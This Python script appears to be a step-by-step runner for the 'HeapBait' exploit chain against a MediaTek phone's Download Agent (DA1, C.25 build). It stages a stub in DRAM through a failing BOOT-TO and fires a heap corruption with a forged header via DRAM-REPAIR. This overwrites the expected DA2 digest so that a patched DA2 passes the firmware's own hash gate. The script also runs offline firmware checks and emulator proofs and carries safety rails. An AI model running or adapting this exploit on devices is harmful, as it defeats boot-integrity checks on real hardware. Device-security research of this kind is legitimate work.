#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DA1 C.25 on-device runner ("mission control") for the HeapBait chain.

Chain being exercised (proven offline in docs/notes/da1_chain_c25.py, PASS):
    failing CMD:BOOT-TO  ->  stages 76-byte stub + digest at 0x40000000
    CMD:DEBUG:DRAM-REPAIR (L=0x3C, constant fake header) -> free() writes
        dpc->cb = 0x40000000
    cmd_loop blx r4 @0x20401C -> stub -> copies digest into slot 0x264C28,
        clears dpc, returns to 0x204020 -> DA survives
    real CMD:BOOT-TO with the patched DA2 now passes DA1's own hash gate.

Modes
-----
  check          offline. Re-derives the constant table from the container
                 with da1_static_audit.py logic and REFUSES to proceed unless
                 the firmware is the expected C.25 build (right-firmware gate).
  verify-offline offline. Runs the Unicorn proof (da1_chain_c25.py) so the
                 user can validate his local setup BEFORE touching the phone.
  device         on-device attempt, one step at a time via --step N:

    step 1  attach preloader/BROM, load C.25 DA1 (mtkclient standard path,
            --stock semantics: DA1 is NOT patched), benign handshake,
            verify DA1 answers SET-HOST-INFO / GET-HW-INFO, print responses.
    step 2  stage stub+digest at 0x40000000 via the FAILING BOOT-TO
            (160-byte blob, 0x4c stub + 0x80-off digest). Expect a hash
            mismatch (ERR), NOT a transport error.
    step 3  fire: DRAM-REPAIR with L=0x3C and the constant fake header.
            Expected: DA answers ERR (good - fire was silent) OR the DA
            dies (acceptable - recover by re-loading DA1, see step 5).
    step 4  post-fire probe: benign command; if the DA answers, send the
            real BOOT-TO with the PATCHED DA2 (one inert byte flipped in
            the zero-padding region, see PATCH_OFFSET/PATCH_XOR below).
            Hash gate expected to PASS (CMD:END OK). On success: STOP.
    step 5  recovery: re-attach and re-load DA1 (safe, expected operation).

Safety rails
------------
  --dry-run       print exactly what WOULD be sent, send nothing, no USB.
  no retries      every send is single-shot (OPLUS_LEGACY_HOST=1 semantics).
  no flash writes this script never issues CMD:WRITE-FLASH / ERASE-FLASH,
                  never touches seccfg, never writes RPMB (read-counter and
                  data untouched).
  step gating     steps must be run one at a time; each prints
                  "expected vs got" and stops on the first surprise.

What this can and cannot damage
-------------------------------
  - A DA1 crash (host crash / deadlock) is RECOVERABLE: re-enter BROM with
    the 3-button combo and re-load DA1 (step 5). Nothing persistent.
  - Nothing here writes flash. seccfg is NOT touched. The RPMB write
    counter is NOT touched (no RPMB writes at all).
  - FORBIDDEN ACTIONS (never do these with the fire chain active):
        * CMD:WRITE-FLASH / CMD:ERASE-FLASH (incl. `mtk.py w/wf/e` on
          seccfg) - the anti-tamper scrubber would erase the region.
        * any RPMB write (would burn the one-way write counter).

Honesty note: parts of the on-device flow that cannot be fully verified
offline are implemented as far as possible and marked TODO-ON-DEVICE; they
FAIL LOUDLY with an explanation instead of faking success.
"""
from __future__ import annotations

import argparse
import hashlib
import os
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_REPO = os.path.dirname(os.path.dirname(_HERE))
for _p in (_HERE, _REPO):
    if _p not in sys.path:
        sys.path.insert(0, _p)

# ---------------------------------------------------------------------------
# constants (C.25 = DekuzenOkahiro's unit, container mt6789_realme.bin)
# ---------------------------------------------------------------------------
DEFAULT_CONTAINER = "/tmp/opencode/mt6789_realme.bin"
EXPECT_CONTAINER_SHA = ("024d01b80a0ef2e50d4dae83ca90f359"
                        "4c9879586163421d0f2fcb7bd6abb811")
DA1_OFF, DA1_LEN = 0xBC, 0x64D58
DA2_OFF, DA2_LEN = 0x64E14, 0x548C0
DA2_SIG = 0x100
DA2_BODY_LEN = DA2_LEN - DA2_SIG          # 0x547C0
DA1_AT = 0x200000

# expected C.25 constant table (all re-derived in check mode, never trusted)
EXPECTED_C25 = {
    "fire_write":        0x2042C0,   # free() core write  dpc->cb = r1
    "blx_cb":            0x20401C,   # cmd_loop blx r4 site
    "digest_slot":       0x264C28,   # expected-DA2 sha256 slot in DA1
    "dram_repair_handler": 0x202BB8,  # CMD:DEBUG:DRAM-REPAIR handler
    "boot_to":           0x200FEC,   # CMD:BOOT-TO handler
    "download":          0x24D9EC,   # fp_read_host_file
    "registrar":         0x200E3C,   # command-table registrar
    "sha256":            0x24FA00,   # SHA-256 entry (hw crypto wrapper)
}
CHECK_LABELS = {
    "fire_write": "fire write (free core)",
    "blx_cb": "cmd_loop blx site",
    "digest_slot": "DA2 digest slot",
    "dram_repair_handler": "DRAM-REPAIR handler",
    "boot_to": "BOOT-TO handler",
    "download": "download handler",
    "registrar": "registrar",
    "sha256": "SHA-256 entry",
}

# DA2 patch: one inert byte in the zero-padding region (proven offline).
PATCH_OFFSET = 0x51D3C
PATCH_XOR = 0x01

STAGING_ADDR = 0x40000000
L_FINAL = 0x3C
STUB_LEN = 0x4C
DIGEST_OFF = 0x80
BLOB_LEN = DIGEST_OFF + 32                # 160 bytes


def hx(v):
    return "0x%x" % v if isinstance(v, int) else str(v)


def safety_block():
    print("=" * 78)
    print("SAFETY BLOCK - read before running any device step")
    print("=" * 78)
    print("  CAN damage   : DA1 can crash/hang (host side only). Recovery =")
    print("                 re-enter BROM (3-button combo) + re-load DA1")
    print("                 (this script's --step 5). Nothing persistent.")
    print("  CANNOT damage: no flash writes at all (no CMD:WRITE-FLASH,")
    print("                 no CMD:ERASE-FLASH, seccfg never touched).")
    print("                 No RPMB writes - the RPMB write-counter stays")
    print("                 untouched.")
    print("  FORBIDDEN while this chain is active:")
    print("                   - any WRITE-FLASH to seccfg (anti-tamper scrubber)")
    print("                   - any RPMB write")
    print("=" * 78)


# ---------------------------------------------------------------------------
# helpers shared by all modes: rebuild the exact blobs from the proven chain
# ---------------------------------------------------------------------------
def load_chain_module(container):
    """Import da1_chain_c25 and point it at the given container."""
    import da1_chain_c25 as c25
    c25.CONTAINER = container
    c25.patch_modules()
    return c25


def build_blobs(container):
    """Return (da1_path, da2_path, blob160, patched_body, digest) or None."""
    c25 = load_chain_module(container)
    data = open(container, "rb").read()
    da1 = data[DA1_OFF:DA1_OFF + DA1_LEN]
    da2 = data[DA2_OFF:DA2_OFF + DA2_LEN]
    os.makedirs(c25.OUTDIR, exist_ok=True)
    da1_path = os.path.join(c25.OUTDIR, "da1.bin")
    da2_path = os.path.join(c25.OUTDIR, "da2.bin")
    open(da1_path, "wb").write(da1)
    open(da2_path, "wb").write(da2)
    stub, _asm = c25.build_stub()
    body, _old, digest = c25.patched_da2(da2_path)
    blob = c25.make_blob(stub, digest)
    payload = c25.make_payload(L_FINAL, STAGING_ADDR)
    return {"da1_path": da1_path, "da2_path": da2_path, "blob": blob,
            "body": body, "digest": digest, "payload": payload,
            "stub": stub, "c25": c25}


# ---------------------------------------------------------------------------
# MODE check - right-firmware gate (offline, static audit re-derivation)
# ---------------------------------------------------------------------------
def run_check(container):
    import da1_static_audit as audit_mod

    print("-- MODE check: right-firmware gate (offline static audit) --")
    try:
        raw = open(container, "rb").read()
    except OSError as exc:
        print(f"FATAL: cannot read container {container}: {exc}")
        return 2
    got_sha = hashlib.sha256(raw).hexdigest()
    print(f"container        : {container}")
    print(f"  size / sha256  : {len(raw):#x} / {got_sha}")
    if got_sha != EXPECT_CONTAINER_SHA:
        print("  WARNING: container sha256 differs from the audited C.25 build")
        print(f"           expected {EXPECT_CONTAINER_SHA}")
        print("           continuing: the address table below is the real gate")

    container_struct = audit_mod.parse_container(raw)
    da1_region = (audit_mod.choose_da1_region(container_struct, raw)
                  if container_struct else None)
    if container_struct and da1_region is None:
        print("FATAL: no DA1 region with CMD:BOOT-TO found in container")
        return 2
    if container_struct:
        blob = raw[da1_region["buf"]: da1_region["buf"] + da1_region["len"]]
        base = da1_region["addr"]
        sig_len = da1_region["sig_len"]
        da2_data = None
        for entry in container_struct["entries"]:
            for region in entry["regions"]:
                if region.get("sane") and region["addr"] == 0x40000000:
                    da2_data = raw[region["buf"]:region["buf"] + region["len"]]
        if da2_data is None:
            da2_data = raw[DA2_OFF:DA2_OFF + DA2_LEN]
    else:
        blob, base, sig_len, da2_data = raw, DA1_AT, None, None

    audit = audit_mod.Audit(blob, base, container)
    audit.identity(container_struct, da1_region,
                   {"size": len(raw), "sha256": got_sha})
    audit.self_test()
    table = audit.discover_table()
    audit.resolve_heap()
    audit.resolve_download()
    surface = audit.resolve_hash_surface(sig_len)
    predicate = audit.predicate()
    audit.hash_candidates(da2_data, "embedded DA2", surface)

    heap = audit.res.get("heap", {})
    dl = audit.res.get("download", {})
    sf = audit.res.get("da2_surface", {})

    resolved = {
        "fire_write": audit_mod.as_int(heap.get("fire_write", {}).get("va")),
        "blx_cb": audit_mod.as_int(heap.get("blx_cb", {}).get("va")),
        "digest_slot": audit_mod.as_int(sf.get("slot_va")),
        "dram_repair_handler": audit_mod.as_int(predicate.get("cmd_handler")),
        "boot_to": audit_mod.as_int(sf.get("boot_to_handler")),
        "download": audit_mod.as_int(dl.get("function")),
        "registrar": (table or {}).get("registrar"),
        "sha256": audit_mod.as_int(sf.get("sha_entry")),
    }
    resolved["registrar"] = audit_mod.as_int(resolved["registrar"])

    print()
    print("-- re-derived C.25 constant table vs expected --")
    mismatches = []
    for key in EXPECTED_C25:
        want, got = EXPECTED_C25[key], resolved.get(key)
        ok = (got == want)
        print(f"  {CHECK_LABELS[key]:26s}: expected {want:#010x}  "
              f"derived {hx(got) if got is not None else 'ABSENT':>10s}  "
              f"{'MATCH' if ok else 'MISMATCH'}")
        if not ok:
            mismatches.append((key, want, got))

    # predicate / tripwire / clamp gates
    verdict = predicate.get("verdict")
    trip = predicate.get("tripwire_present")
    registered = predicate.get("cmd_registered_in_table")
    clamp = dl.get("classification")
    print()
    print(f"  DRAM-REPAIR registered : {'YES' if registered else 'NO'}"
          f"  (required: YES)")
    print(f"  tripwire string        : {'PRESENT' if trip else 'ABSENT'}"
          f"  (required: ABSENT)")
    print(f"  predicate verdict      : {verdict}  (required: VULNERABLE)")
    print(f"  download clamp         : {clamp}  (required: UNCLAMPED)")

    # digest slot rule cross-check: slot must hold sha256(da2[:-0x100])
    slot_ok = None
    if da2_data is not None and len(da2_data) == DA2_LEN:
        slot_off = EXPECTED_C25["digest_slot"] - DA1_AT
        slot = blob[slot_off:slot_off + 32]
        want = hashlib.sha256(da2_data[:-DA2_SIG]).digest()
        slot_ok = (slot == want)
        print(f"  slot == sha256(da2[:-0x100]) : "
              f"{'PASS' if slot_ok else 'FAIL'}")

    print()
    problems = []
    if not registered:
        problems.append("DRAM-REPAIR is NOT registered in the command table "
                        "(wrong or patched firmware)")
    if trip:
        problems.append("DA2 tripwire string is PRESENT (patched firmware)")
    if verdict != "VULNERABLE":
        problems.append(f"predicate verdict is {verdict!r}, expected VULNERABLE")
    if clamp != "UNCLAMPED":
        problems.append(f"download path is {clamp!r}; HeapBait overflow not "
                        f"reachable on this path")
    if mismatches:
        for key, want, got in mismatches:
            problems.append(f"address {CHECK_LABELS[key]}: derived "
                            f"{hx(got)}, expected {want:#x}")
    if slot_ok is False:
        problems.append("digest slot rule mismatch: slot != sha256(da2[:-0x100])")

    if problems:
        print("REFUSING TO PROCEED - this is NOT the expected C.25 firmware:")
        for p in problems:
            print(f"  - {p}")
        print()
        print("RESULT: check FAIL (right-firmware gate)")
        return 1
    print("  all gates PASS: DRAM-REPAIR live, no tripwire, unclamped "
          "download, all 8 addresses match the C.25 table, digest slot "
          "rule confirmed.")
    print()
    print("RESULT: check PASS (right-firmware gate)")
    return 0


# ---------------------------------------------------------------------------
# MODE verify-offline - run the proven Unicorn proof on this machine
# ---------------------------------------------------------------------------
def run_verify_offline(container):
    print("-- MODE verify-offline: Unicorn proof of the full chain --")
    try:
        c25 = load_chain_module(container)
    except SystemExit as exc:
        print(f"FATAL: {exc}")
        return 2
    argv = ["--quick", "--runs", "1", "--no-regression"]
    print(f"running docs/notes/da1_chain_c25.py {' '.join(argv)}")
    print("(full sweep/determinism available by running that script directly)")
    print()
    rc = c25.main(argv)
    print()
    if rc == 0:
        print("RESULT: verify-offline PASS - local setup reproduces the "
              "chain. Safe to proceed to --mode device --step 1.")
    else:
        print("RESULT: verify-offline FAIL - do NOT touch the phone until "
              "this passes on this machine.")
    return rc


# ---------------------------------------------------------------------------
# MODE device - one step at a time, mtkclient transport, maximum safety
# ---------------------------------------------------------------------------
DRAM_REPAIR_XML_NOTE = (
    "The DRAM-REPAIR command XML is byte-identical to the one proven in the\n"
    " emulator (docs/notes/da1_heap_sweep.py CMD_XML): param_file download,\n"
    " declared length L=0x3C, stream 0x4C bytes, fake header at offset 0x40.")


def dram_repair_xml():
    import da1_heap_sweep as hs
    return hs.CMD_XML


def fmt_blob(blob, width=32):
    lines = []
    for i in range(0, len(blob), width):
        lines.append(f"  {i:04x}: {blob[i:i + width].hex()}")
    return "\n".join(lines)


def dry_run(step, blobs):
    """Print exactly what a step would send. No USB, no mtkclient import."""
    print(f"-- MODE device --step {step} --dry-run (nothing will be sent) --")
    if blobs is None:
        print("FATAL: cannot build blobs from the container")
        return 2
    blob, body, payload = blobs["blob"], blobs["body"], blobs["payload"]
    digest = blobs["digest"]
    if step == 1:
        print("step 1 would do (mtkclient standard path):")
        print("  1. MtkConfig(loader=<container>, stock=True) -> Mtk ->")
        print("     DaHandler.connect(mtk)          # preloader/BROM attach")
        print("  2. daloader.daconfig.setup() + set_da() + da.upload_da1()")
        print(f"     -> send_da(DA1 {DA1_LEN:#x} bytes @ {DA1_AT:#x}), jump,")
        print("     then DA1's own benign handshake:")
        for name, xml in (
                ("SET-RUNTIME-PARAMETER (setup_env)", None),
                ("CMD:HOST-SUPPORTED-COMMANDS (setup_hw_init)", None),
                ("CMD:SET-HOST-INFO (setup_host_info)", None)):
            print(f"       - {name}")
        print("  3. probe: CMD:GET-HW-INFO -> print response verbatim")
        print("  expected: CMD:START after jump, all handshake commands OK,")
        print("            a da_hw_info XML reply.")
    elif step == 2:
        print(f"step 2 would send CMD:BOOT-TO at_address={STAGING_ADDR:#x} "
              f"jmp_address={STAGING_ADDR:#x} "
              f"source_file=MEM://<host>:0x{len(blob):x}")
        print(f"then upload {len(blob)} bytes (stub {STUB_LEN:#x} B at +0, "
              f"digest 32 B at +{DIGEST_OFF:#x}):")
        print(fmt_blob(blob))
        print(f"  digest = sha256(patched DA2 body) = {digest.hex()}")
        print("  expected: DA downloads the blob, hashes it, compares against")
        print("            slot 0x264C28 -> MISMATCH -> ERR (rc 0xC0070004")
        print("            class), NOT a transport error. Blob staged at")
        print(f"            {STAGING_ADDR:#x}.")
    elif step == 3:
        xml = dram_repair_xml()
        print("step 3 would send (declared length L=0x3C):")
        print(f"  XML: {xml!r}")
        print(f"then upload {len(payload)} bytes (zeros + 12-byte fake header "
              f"at offset 0x40):")
        print(fmt_blob(payload))
        print("  fake header = {0xDEADBEEF, 0x2DF79C, 0x40000000} "
              "(magic, forged node, cb)")
        print("  expected: DA answers ERR (good: fire happened silently) OR")
        print("            the DA dies (acceptable: recover with --step 5).")
    elif step == 4:
        print("step 4 would:")
        print("  1. probe CMD:GET-HW-INFO; if no answer -> stop, go to step 5")
        print("  2. send CMD:BOOT-TO with the PATCHED DA2 body "
              f"({DA2_BODY_LEN:#x} bytes):")
        old_b = body[PATCH_OFFSET]
        print(f"     patch = body[{PATCH_OFFSET:#x}] ^= {PATCH_XOR:#04x} "
              f"(inert zero-padding byte, {old_b:#04x} -> "
              f"{old_b ^ PATCH_XOR:#04x}); length unchanged")
        print(f"     digest now = {digest.hex()}")
        print("     (full 0x547c0-byte body upload follows the BOOT-TO XML;")
        print("      first 64 bytes on the wire:)")
        print(fmt_blob(body[:64]))
        print("  expected: hash gate PASSES (CMD:END OK, dpc->cb=0x40000000)")
        print("  on success: STOP. Do not run further steps.")
    elif step == 5:
        print("step 5 (recovery) would:")
        print("  1. if the device is gone from USB: unplug/replug while")
        print("     holding the 3-button combo to re-enter BROM/preloader")
        print("  2. re-attach (DaHandler.connect) and re-load the C.25 DA1")
        print("     exactly like step 1 (benign handshake only, no fire)")
        print("  This is always safe: DA1 load is the standard mtkclient op.")
    else:
        print(f"no such step {step}")
        return 2
    print()
    print("RESULT: dry-run complete (nothing sent)")
    return 0


# ---------------------------------------------------------------------------
# device adapter (mtkclient reused, no mtkclient file is modified)
# ---------------------------------------------------------------------------
def device_attach_and_load_da1(container):
    """Attach preloader/BROM and load DA1 only (mtkclient transport).

    Mirrors DaHandler.connect + the DA1 half of upload_da1, but stops after
    DA1's benign handshake so DA2 is NOT booted (the chain must run while
    DA1 is alive). Returns (mtk, da) or raises DeviceError.
    """
    import mtk as mtk_cli
    import logging
    from mtkclient.config.mtk_config import MtkConfig
    from mtkclient.Library.mtk_class import Mtk
    from mtkclient.Library.DA.mtk_da_handler import DaHandler

    config = MtkConfig(loglevel=logging.INFO, gui=None, guiprogress=None)
    config.stock = True            # keep DA1 UNpatched (stock C.25 build)
    config.loader = container      # our C.25 DA container
    mtk = Mtk(config=config, loglevel=logging.INFO)

    da_handler = DaHandler(mtk, logging.INFO)
    print("[*] attaching (waiting for preloader/BROM VCOM; use the "
          "3-button combo while plugging in) ...")
    mtk = da_handler.connect(mtk)
    if mtk is None:
        raise DeviceError("attach failed: no preloader/BROM handshake within "
                          "the attempt window. Re-run this step while "
                          "plugging the target in with the combo held.")

    dl = mtk.daloader
    dl.patch = False               # never let mtkclient patch our DA1
    print(f"[*] loading C.25 DA1 from {os.path.basename(container)} "
          "(stock, unpatched; DA2 NOT booted) ...")
    if dl.daconfig.setup() is None:
        raise DeviceError("da_loader could not be resolved from the container "
                          "(parse_da_loader failed). TODO-ON-DEVICE: check "
                          "`docs/notes/rmx3630-da2/README.md` container "
                          "layout vs mtkclient's parser.")
    dl.daconfig.extract_emi(mtk.config.preloader)
    dl.set_da()
    if not dl.da.upload_da1():
        raise DeviceError("DA1 upload/jump/handshake failed (mtkclient "
                          "reported the error above). Re-run step 1.")
    print("[+] DA1 loaded and benign handshake done (SET-RUNTIME-PARAMETER, "
          "HOST-SUPPORTED-COMMANDS, SET-HOST-INFO).")
    return mtk, dl.da


class DeviceError(Exception):
    pass


def device_step(step, container, blobs):
    os.environ["OPLUS_LEGACY_HOST"] = "1"   # single-shot sends, NO retries
    da = None
    if step == 1 or step == 5:
        mtk, da = device_attach_and_load_da1(container)
        if step == 5:
            print("[+] recovery complete: DA1 re-loaded, benign handshake "
                  "only. Re-run step 2 to restart the attempt.")
            return 0
        # verify DA1 answers commands, print responses verbatim
        print("[*] probe 1: CMD:SET-HOST-INFO")
        r1 = da.send_command(da.cmd.cmd_set_host_info())
        print(f"    -> {r1!r}")
        print("[*] probe 2: CMD:GET-HW-INFO (response printed verbatim)")
        r2 = da.send_command(da.cmd.cmd_get_hw_info())
        print(f"    -> {r2!r}")
        if r1 is False or not r2 or r2 is False:
            print("[-] DA1 did not answer the benign probes - do NOT fire.")
            return 1
        print("[+] step 1 PASS: DA1 alive and answering. Next: --step 2")
        return 0

    # steps 2-4 continue from an already-loaded DA1 session: attach is NOT
    # repeated (a second attach would re-enter the preloader and reset the
    # staged state). We require the user to chain the steps in one session
    # order; to keep the script stateless-but-safe we re-attach ONLY when
    # the previous session is gone (port already dead).
    # TODO-ON-DEVICE: steps 2-4 must run against the SAME DA1 session as
    # step 1 (staging at 0x40000000 survives only in that session). Run
    # them immediately after step 1 without re-plugging.
    mtk, da = device_attach_existing(container)
    try:
        if step == 2:
            return device_step2(da, blobs)
        if step == 3:
            return device_step3(da, blobs)
        if step == 4:
            return device_step4(da, blobs)
    finally:
        pass
    return 2


def device_attach_existing(container):
    """Attach WITHOUT resetting anything: reuse a live CDC session if the
    preloader window is still open; otherwise fail loudly."""
    import logging
    from mtkclient.config.mtk_config import MtkConfig
    from mtkclient.Library.mtk_class import Mtk
    from mtkclient.Library.DA.mtk_da_handler import DaHandler

    config = MtkConfig(loglevel=logging.INFO, gui=None, guiprogress=None)
    config.stock = True
    config.loader = container
    mtk = Mtk(config=config, loglevel=logging.INFO)
    da_handler = DaHandler(mtk, logging.INFO)
    mtk.port.wait_for_device(max_attempts=1, wait=False)
    if not (mtk.port.cdc and mtk.port.cdc.connected):
        raise DeviceError(
            "no live DA1 session found. Steps 2-4 must run in the SAME DA1 "
            "session as step 1: run --step 1, and while the device stays "
            "plugged in, immediately run --step 2 (then 3, then 4). "
            "TODO-ON-DEVICE: if mtkclient cannot reuse the open port on your "
            "host, chain all sends in one python session (import this "
            "module's device_step helpers directly).")
    dl = mtk.daloader
    dl.patch = False
    dl.daconfig.setup()
    dl.daconfig.extract_emi(mtk.config.preloader)
    dl.set_da()
    return mtk, dl.da


def device_step2(da, blobs):
    blob = blobs["blob"]
    print(f"[*] staging {len(blob)} bytes at {STAGING_ADDR:#x} via the "
          "FAILING CMD:BOOT-TO ...")
    print(f"    expected: hash-mismatch ERR (DA1 slot 0x264C28 holds the"
          f" OLD digest), NOT a transport error")
    result = da.send_command(
        da.cmd.cmd_boot_to(at_addr=STAGING_ADDR, jmp_addr=STAGING_ADDR,
                           length=len(blob)))
    print(f"    BOOT-TO response: {result!r}")
    if type(result).__name__ == "DwnFile":
        up = da.upload(result, blob, display=False)
        print(f"    upload -> {up!r}")
        # read back what the DA says after the staging download
        try:
            cmd, res = da.get_command_result()
            print(f"    DA verdict: cmd={cmd!r} result={res!r}")
        except Exception as exc:
            print(f"    DA verdict: no response captured ({exc!r})")
        print("    staging download completed at transport level; the hash")
        print("    verdict line above decides success.")
        # TODO-ON-DEVICE: on-device we cannot read the ERR rc directly from
        # this return path; classify by the captured text.
        return 0 if up else 1
    print("[-] no DwnFile upload request - the staging download did not")
    print("    reach the data phase. If the DA printed a transport error")
    print("    (EIO/timeout), do NOT fire; re-run step 1.")
    return 1


def device_step3(da, blobs):
    payload = blobs["payload"]
    xml = dram_repair_xml()
    print(f"[*] firing: CMD:DEBUG:DRAM-REPAIR, L={L_FINAL:#x}, "
          f"payload {len(payload)} bytes")
    print(DRAM_REPAIR_XML_NOTE)
    print(f"    XML: {xml!r}")
    result = da.send_command(xml)
    print(f"    DRAM-REPAIR response: {result!r}")
    if type(result).__name__ == "DwnFile":
        up = da.upload(result, payload, display=False)
        print(f"    upload -> {up!r}")
        try:
            cmd, res = da.get_command_result()
            print(f"    DA verdict: cmd={cmd!r} result={res!r}")
        except Exception as exc:
            print(f"    DA verdict: no response ({exc!r}) - DA likely dead,")
            print("    which is ACCEPTABLE if the fire happened silently.")
            print("    Recovery: --step 5.")
            return 1
        # ERR is the GOOD outcome: the handler rejected the repair but the
        # free() write already happened.
        print("[+] fire command answered (ERR expected). Next: --step 4")
        return 0
    print(f"[-] unexpected response {result!r}: no download phase. If the")
    print("    DA is dead, that is still acceptable - recover with --step 5.")
    return 1


def device_step4(da, blobs):
    body = blobs["body"]
    print("[*] post-fire probe: CMD:GET-HW-INFO")
    r = da.send_command(da.cmd.cmd_get_hw_info())
    print(f"    -> {r!r}")
    if not r or r is False:
        print("[-] DA did not answer the benign probe -> treat the DA as")
        print("    dead: run --step 5 (re-attach + DA1 reload), then start")
        print("    over from --step 2 in the new session.")
        return 1
    print("[+] DA alive after the fire.")
    print(f"[*] sending the REAL CMD:BOOT-TO with the PATCHED DA2 "
          f"({DA2_BODY_LEN:#x} bytes) ...")
    print(f"    patch = body[{PATCH_OFFSET:#x}] ^= {PATCH_XOR:#04x} "
          "(one inert zero-padding byte)")
    result = da.send_command(
        da.cmd.cmd_boot_to(at_addr=STAGING_ADDR, jmp_addr=STAGING_ADDR,
                           length=len(body)))
    print(f"    BOOT-TO response: {result!r}")
    if type(result).__name__ == "DwnFile":
        up = da.upload(result, body, display=True)
        print(f"    upload -> {up!r}")
        if up:
            print()
            print("=" * 78)
            print("SUCCESS: DA1's own hash gate PASSED (rc=0) with the")
            print("patched DA2. THE CHAIN WORKED ON DEVICE.")
            print(">>> STOP HERE. Do not send more commands in this")
            print(">>> session; continue your normal DA2 workflow.")
            print("=" * 78)
            return 0
        print("[-] upload of the patched DA2 failed - inspect the DA's")
        print("    verbatim error above and report it back.")
        return 1
    print("[-] no DwnFile for the patched BOOT-TO (gate did not open or")
    print("    transport error). Report the verbatim output back.")
    return 1


def run_device(container, step, dry):
    if dry:
        blobs = None
        try:
            blobs = build_blobs(container)
        except SystemExit as exc:
            print(f"FATAL: {exc}")
            return 2
        return dry_run(step, blobs)

    try:
        blobs = build_blobs(container)
    except SystemExit as exc:
        print(f"FATAL: {exc}")
        return 2
    try:
        import usb  # noqa: F401  (pyusb must be installed for device mode)
    except Exception as exc:
        print("FATAL: device mode needs pyusb + libusb on the host "
              f"({exc!r}). Install per docs/notes/reverse/"
              "re-da1-c25-runbook-2026-10-26.md, or use --dry-run here.")
        return 3
    try:
        return device_step(step, container, blobs)
    except DeviceError as exc:
        print(f"[-] DEVICE: {exc}")
        print()
        print("This is the expected offline/no-device outcome: run this step")
        print("on the host that has the target attached (see the runbook).")
        return 3
    except Exception as exc:  # attach/transport failures must not traceback
        print(f"[-] DEVICE error (no traceback, single-shot, no retries): "
              f"{exc!r}")
        print("If the DA was mid-chain, run --step 5 (recovery) and restart")
        print("from --step 2. Report the log lines above back to us.")
        return 4


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def main(argv=None):
    ap = argparse.ArgumentParser(
        description="DA1 C.25 HeapBait on-device runner (check / "
                    "verify-offline / device --step N)")
    ap.add_argument("--mode", required=True,
                    choices=["check", "verify-offline", "device"])
    ap.add_argument("--container", default=DEFAULT_CONTAINER,
                    help=f"DA container (default {DEFAULT_CONTAINER})")
    ap.add_argument("--step", type=int, default=None,
                    help="device mode: 1..5 (one step at a time)")
    ap.add_argument("--dry-run", action="store_true",
                    help="print what would be sent, send nothing")
    args = ap.parse_args(argv)

    if args.mode == "device":
        if args.step is None or not 1 <= args.step <= 5:
            ap.error("--mode device requires --step N with N in 1..5 "
                     "(1=load+handshake, 2=stage via failing BOOT-TO, "
                     "3=fire DRAM-REPAIR, 4=post-fire probe+patched "
                     "BOOT-TO, 5=recovery)")
        if args.step != 1 and args.step != 5 and args.dry_run:
            print("NOTE: --dry-run for steps 2-4 assumes the DA1 session")
            print("from step 1 is still alive (staging lives in that")
            print("session's DRAM).\n")

    if not os.path.exists(args.container):
        print(f"FATAL: container not found: {args.container}")
        return 2

    safety_block()
    print()
    if args.mode == "check":
        rc = run_check(args.container)
    elif args.mode == "verify-offline":
        rc = run_verify_offline(args.container)
    else:
        rc = run_device(args.container, args.step, args.dry_run)
    return rc


if __name__ == "__main__":
    sys.exit(main())
